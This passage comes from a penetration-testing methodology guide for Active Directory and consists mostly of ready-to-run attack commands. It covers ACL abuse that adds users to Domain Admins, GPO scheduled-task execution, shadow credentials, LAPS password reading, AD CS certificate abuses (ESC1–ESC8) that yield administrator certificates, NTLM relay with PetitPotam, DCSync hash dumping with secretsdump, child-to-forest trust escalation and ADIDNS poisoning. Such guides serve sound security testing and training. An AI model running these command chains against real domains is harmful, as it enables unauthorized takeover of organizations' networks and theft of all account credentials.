#### Abusing Add self/AddMember  on Group
This gives the ability to be added in a specific group
```
ldeep ldap -u pentestuser -p 'myPassWord' -d my.domain.com -s ldap://10.X.X.X add_to_group "CCN=pentestuser,OU=...,DC=..." "CN=Work Station,OU=..."
```
#### Abusing WriteOwner on Group
With writeOwner privilege, it is possible to change the owner of a specific group to own it. Assuming the privilege is granted over the group named "ACCOUNTING":
```
owneredit.py -action read -target 'ACCOUNTING' -hashes ':aaaaaaaaaabbbbbbbbbbbcccccddddeeecfe' my.domain.com/pentestuser

owneredit.py -action write -new-owner 'pentestuser' -target 'ACCOUNTING' -hashes ':aaaaaaaaaabbbbbbbbbbbcccccddddeeecfe' sevenkingdoms.local/tyron.lannister
```
As owner of the group, it is possbile change the acl and give GenericAll (FullControl) on the group with `dacledit.py`.

#### Abusing Generic all on user
This privilege grants an attacker full control over a target user account. This allows the attacker to change the target's password or to perform targeted kerberoasting attack.

#### Abusing Generic all on group
This privilege allows an attacker to manipulate group memberships. This can be done via direct commands or using modules like Active Directory or PowerSploit. 
```
net group "Domain Admins" pentestuser /add /domain
Add-ADGroupMember -Identity "Domain Admins" -Members pentestuser
Add-NetGroupUser -UserName pentestuser -GroupName "Domain Admins" -Domain "my.domain.com"
```

#### Abusing GenericAll / GenericWrite / Write on computer/user
Holding these privileges on a computer object or a user account allows to take over a computer object via Kerberos Resource-based Constrained Delegation (RBCD) or to impersonate a computer or user account via Shadow Credentials:
- **Kerberos Resource-based Constrained Delegation**
Resource-Based Constrained Delegation (RBCD) is a feature that allows to configure which accounts are trusted to delegate on their behalf. This is done by modifying **msDS-AllowedToActOnBehalfOfOtherIdentity** attribute of the target Active Direcory object.

- **Shadow Credentials**
Shadow Credentials allows the moification of **msDS-KeyCredentialLink** property for user/computer, in order to retrieve the NT hash of that object.
This can be performed with `certipy` tool. In the following example, it will be matter of retrieving 'MACHINEACCOUNT$' computer account hash assuming pentestuser's user account hash GenericWrite privilege over MACHINEACCOUNT.my.domain.com. 
```
certipy shadow auto -u pentestuser@my.domain.com -p 'myPassW0rd' -account 'MACHINEACCOUNT$'
```

#### Reading Laps password
This can be checked with PowerView or crackmapexec
- PowerView
```
Get-DomainComputer | where-Object {$_.'ms-mcs-admpwd'} | select dnshostname, ms-mcs-admpwd | ft
```
- crackmapexec
```
crackmapexec ldap computers.txt -d my.domain.com -u pentestuser -k -M laps
```

#### Abusing privileges over GPOs
A user/computer privileges over GPOs can be checked on GUI via `bloodhound` or can be enumerated using PowerView:
```
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "CORP\pentestuser"}
```
Misconfigured GPOs can be exploited to execute code, for example, by creating an immediate scheduled task. 
```
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators pentestuser /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
This can also be done using `pygpoabuse.py`:
```
python3 pygpoabuse.py my.domain.com/pentestuser:'MyPa$$W0rd' -gpo-id "6F8BD644-2C29-418C-93F1-FE926F91F6B4"
python3 pygpoabuse.py my.domain.com/pentestuser:'MyPa$$W0rd' -gpo-id "6F8BD644-2C29-418C-93F1-FE926F91F6B4" -powershell -command "...." -taskname "MyTask" -description "GPO abuse command"
```
### ADCS
AD CS refers to Active Directory Certificate Services. It is a Microsoft server role that provides public key infrastructure (PKI) functionality for an organization. It enables the creation, management, and deployment of digital certificates, which are used for encrypting data, authenticating users, devices, and services, and ensuring secure communications.

There are multiples ways to escalate privilege using the ADCS misconfigurations. They are labeled ESC# where the # is an incremental number startting from 1.

To find vulnerable certificate templates the following caommands can be run:
```
#Windows
Certify.exe find /vulnerable
#Linux
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
When successful, the command generates a zip file that can be included in bloodhound for GUI analysis.
#### Misconfigured Certificate Templates - ESC1
This refers to the ability for requesters to include a subjectAltName in the Certificate Signing Request (CSR) is allowed by the template. The following conditions should meet in order to have an ESC1 misconfiguration:
- Enrolment rights are granted to low-privileged users by the Enterprise CA.
- Manager approval is not required.
- No signatures from authorized personnel are needed.
- Security descriptors on certificate templates are overly permissive, allowing low-privileged users to obtain enrolment rights.


To abuse this vulnerability to impersonate an administrator one could run:
```
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Then the generated certificate can be transformed to .pfx format and used to authenticate using Rubeus or certipy again:
```
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
#### Misconfigured Certificate Templates - ESC2
The second abuse scenario is a variation of the first one:

1. Enrollment rights are granted to low-privileged users by the Enterprise CA.
2. The requirement for manager approval is disabled.
3. The need for authorized signatures is omitted.
4. An overly permissive security descriptor on the certificate template grants certificate enrollment rights to low-privileged users.
5. **The certificate template is defined to include the Any Purpose EKU or no EKU.**

The Any Purpose EKU permits a certificate to be obtained by an attacker for any purpose, including client authentication, server authentication, code signing, etc. The same technique used for ESC3 can be employed to exploit this scenario.
#### Misconfigured Enrolment Agent Templates - ESC3
This scenario is like the first and second one but abusing a different EKU (Certificate Request Agent) and 2 different templates (therefore it has 2 sets of requirements):

1. The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), known as Enrollment Agent in Microsoft documentation, allows a principal to enroll for a certificate on behalf of another user.
2. The **“enrollment agent”** enrolls in such a template and uses the resulting certificate to co-sign a CSR on behalf of the other user. It then sends the co-signed CSR to the CA, enrolling in a template that permits “enroll on behalf of”, and the CA responds with a certificate belong to the “other” user.

Certify or Certipy can be used to abuse this scenario:
```
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
#### Vulnerable Certificate Template Access Control - ESC4
The security descriptor on certificate templates defines the permissions specific AD principals possess concerning the template.

**ESC4 is when a user has write privileges over a certificate template.** 

Notable permissions applicable to certificate templates include:
- Owner
- FullControl
- WriteOwner
- WriteDacl
- WriteProperty

This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.

Certipy can overwrite the configuration of a certificate template with a single command. By default, Certipy will overwrite the configuration to make it vulnerable to ESC1. `-save-old` parameter can also be specified to save the old configuration, which will be useful for restoring the configuration after our attack.
```
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
#### Vulnerable PKI Object Access Control - ESC5
The extensive web of interconnected ACL-based relationships, which includes several objects beyond certificate templates and the certificate authority, can impact the security of the entire AD CS system. 

The security of the PKI system can be compromised if a low-privileged attacker manages to gain control over any of these critical components.

#### EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6
ESC6 is when the CA specifies the *EDITF_ATTRIBUTESUBJECTALTNAME2* flag. This flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template’s configuration.

Tools like Certify and Certipy are capable of detecting this misconfiguration and exploiting it:

```
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
#### Vulnerable Certificate Authority Access Control - ESC7
Certificate Authorities (CAs) have permissions that secure various actions within AD CS. The **ManageCA** permission grants administrative privileges, allowing modifications to persistent configuration data, including the ability to enable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. The **ManageCertificates** permission, on the other hand, enables the approval of pending certificate requests, potentially bypassing the manager approval requirement.

A combination of Certify and PSPKI modules can be utilized to request, approve, and download a certificate:
```
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
Another attack includes **self grant the  Manage Certificates** access right by adding own user as a new officer and below are the prequisites:
- Only **ManageCA** permission
- **Manage Certificates** permission (can be granted from ManageCA)
- Certificate template  **SubCA** must be enabled (can be enabled from ManageCA)
```
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
```
The **SubCA** template can be enabled on the CA with the -enable-template parameter. By default, the SubCA template is enabled.
```
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
```
Once the prerequisites for this attack are fulfilled, requesting a certificate based on the SubCA template can be performed.

This request will be denied, but the private key should be saved and the request ID noted down.
```
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
With the **Manage CA** and **Manage Certificates**, it is possible to issue the failed certificate request with the ca command and the `-issue-request <request ID>` parameter:
```
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Finally, the issued certificate can be retrieved with the `req` command and the `-retrieve <request ID>` parameter:
```
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
#### NTLM Relay to AD CS HTTP Endpoints – ESC8
The prerequisites for this attack are the following:
- ADCS running on the domain with web enrollment enabled.
- A working coerce method (here we use petitpotam unauthent, but an authenticated printerbug or other coerce methods will work the same)
- A useful template to exploit ESC8, by default on an active directory, its name is DomainController

The web enrollement can be checked at : http://<dc-ip>/certsrv/certfnsh.asp. If that link requests for authentication, all is fine.

In order to exploit this, a listener can be added to relay SMB authentication to HTTP with impacket ntlmrelayx as follows:
```
ntlmrelayx.py -t http://<dc-ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
Next, coerce authentication can be launched with coercer or petitpotam
```
petitpotam.py attacker-ip domain.controller.fqdn
```
Once successful, ntlmrelayx will relay the authentication to the web enrollement and get the certificate which can be used to ask TGT:
```
gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'my.domain.com'/'DC$' 'DC.ccache'
```
With the TGT obtained, DCsync can be launched to get the ntds.dit content:
```
export KRB5CCNAME=DC.ccache
secretsdump.py -k -no-pass my.domain.com/'DC$'@DC.my.domain.com
```

This attack can also be performed with certipy.

- setup the listener :
```
certipy relay -ca $ca_ip_address -template DomainController
```
- trigger the coerce 
```
petitpotam.py $attacker_ip DC.my.domain.com
```
- with the certificate obtained, get the NT hash of the DC and also the TGT :
```
certipy auth -pfx DC.pfx -dc-ip 10.X.X.X
```
- launch a DCsync with secretsdump and the ticket obtained:
```
export KRB5CCNAME=DC.ccache
secretsdump -k -no-pass my.domain.com/'DC$'@DC.my.domain.com

# or with the hash

secretsdump -hashes ':39d964a01c61c19fe36c71627d7ab56c' -no-pass my.domain.com/'DC$'@DC.my.domain.com
```
<!-- #### No Security Extension - ESC9
The new value *CT_FLAG_NO_SECURITY_EXTENSION* (0x80000) for *msPKI-Enrollment-Flag*, referred to as ESC9, prevents the embedding of the new *szOID_NTDS_CA_SECURITY_EXT* security extension in a certificate. This flag becomes relevant when StrongCertificateBindingEnforcement is set to 1 (the default setting), which contrasts with a setting of 2. Its relevance is heightened in scenarios where a weaker certificate mapping for Kerberos or Schannel might be exploited (as in ESC10), given that the absence of ESC9 would not alter the requirements.

#### Misconfigured Certificate Templates - ESC10

#### Misconfigured Certificate Templates - ESC11

#### Misconfigured Certificate Templates - ESC12

#### Misconfigured Certificate Templates - ESC13 -->


### Abusing trust relationship
Trust between domains can be enumerated in numerous ways:
- Using bloodhound
```
MATCH p=(n:Domain)-->(m:Domain) RETURN p
```
- Using PowerView
```
Get-ForestTrust

Get-NetDomainTrust
```
Trust between child and parent domains can be abused to escalate privileges using `raiseChild`:
``` 
raiseChild.py child.domain/child_domain_admin_user:'child_domain_admin_password' 
```
This will create a golden ticket for the forest enterprise admin.
### Configuration checking
#### Checking ADIDNS configuration 
ADIDNS stands for Active Directory integrated DNS. It is a feature that integrates DNS services with Active Directory and  leverages the security features of Active Directory, such as access control lists (ACLs), to secure DNS records.

ADIDNS can be abused using [Powermad](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1).

1. Check if you are able to modify (add) AD DNS names:
```
Get-ADIDNSZone -Credential $cred -Verbose
```
2. Create, configure the new DNS name that could be likely exploited for spoofing with Attacker's IP and enable it:
```
New-ADIDNSNode -DomainController dc1 -Node pc01 -Credential $cred -Verbose
$dnsRecord = New-DNSRecordArray -Type A -Data 10.10.13.37
Set-ADIDNSNodeAttribute -Node pc01 -Attribute dnsRecord -Value $dnsRecord -Credential $cred -Verbose
Enable-ADIDNSNode -DomainController dc1 -Node pc01 -Credential $cred -Verbose
```
3. Check the newly created DNS object and try to resolve it. **AD will need some time (~180 seconds) to sync LDAP changes via its DNS dynamic updates protocol**:
```
Get-ADIDNSNodeAttribute -Node pc01 -Attribute dnsRecord -Credential $cred -Verbose
Resolve-DNSName pc01
cmd /c ping -n 1 pc01
```
4. Clean up:
```
Remove-ADIDNSNode -DomainController dc1 -Node pc01 -Credential $cred -Verbose
```

- ADIDNS Poisoning (Wildcard Injection)
```
python dnstool.py -u 'my.domain.com\pentestuser' -p 'Passw0rd!' -r '*' --action query DC01.my.domain.com
python dnstool.py -u 'my.domain.com\pentestuser' -p 'Passw0rd!' -r 'wpad' --action query DC01.my.domain.com
```
#### Check Channel binding  and LDAP signing configuration
Channel Binding is a security mechanism used to associate a client and server session with a specific transport connection. It is used to mitigate Man-in-the-Middle Attacks by preventing attackers from replaying authentication tokens on different connections.

LDAP Signing is a feature in that requires LDAP communications to be digitally signed. It ensures that the LDAP data packets cannot be modified by unauthorized entities during transmission.

These two features can be checked using `LdapRelayScan`:

```
python3 LdapRelayScan.py -method BOTH -dc-ip 10.0.0.X -u domainuser1 -p badpassword2
```
#### Password Policy checking
This can be checked with crackmapexec:
```
crackmapexec smb $DC-IP -u 'user' -p 'password' --pass-pol
crackmapexec smb $DC-IP -u 'user' -k --pass-pol
```
#### Machine quota
```
#PowerView
Get-DomainObject -Identity my.domain.com -Properties ms-DS-MachineAccountQuota

#bloodyAD
bloodyad -d $DOMAIN -u $USER -p $PASSWORD --host $DOMAIN_CONTROLLER get object 'DC=acme,DC=local' --attr ms-DS-MachineAccountQuota

#ldeep
ldeep ldap -d $DOMAIN -u $USER -p $PASSWORD -s $DOMAIN_CONTROLLER search '(objectclass=domain)' | jq '.[]."ms-DS-MachineAccountQuota"'

#crackmapexec
crackmapexec ldap $DOMAIN_CONTROLLER  -u $USER -p $PASSWORD -M MAQ
```
### Health check analysis
This can be performed using [PingCaslte](https://www.pingcastle.com/)
It is a tool designed to assess quickly the Active Directory security level with a methodology based on risk assessment and a maturity framework. It provides deliverables for the following queries:
- The number of domains present in the environment
- The criticality level of the Active Directory environment
- The critical security issue
- Overview of the technical situation
- A dvice to prioritize the items in the Action plan
- Guidance to fix issues
- Dashboard for management

PingCastle should be run in a Windows computer having a connectivity to the AD network, preferably from a domain joint computer.
It can be executed in an interactive mode, by double clicking the program and choosing **healthcheck** option or choosing a command line mode as follows:
```
PingCastle.exe healthcheck server my.domain.com


```

## References
- https://github.com/Orange-Cyberdefense/GOAD
- https://mayfly277.github.io/posts/GOADv2/
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/unconstrained-delegation
- https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/adidns-abuse
- https://www.pingcastle.com/
- https://github.com/zyn3rgy/LdapRelayScan
- https://www.thehacker.recipes/ad/movement/builtins/machineaccountquota
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-trust-accountusd-accessing-resources-on-a-trusted-domain-from-a-trusting-domain
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/gpo-abuse
- https://book.hacktricks.xyz/fr/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials
- https://book.hacktricks.xyz/windows-hardening/lateral-movement
- https://security.packt.com/nopac-vulnerability/
-https://www.thehacker.recipes/ad/movement/ntlm/relay
- https://stridergearhead.medium.com/ipv6-attack-ad-attack-ea50476dccee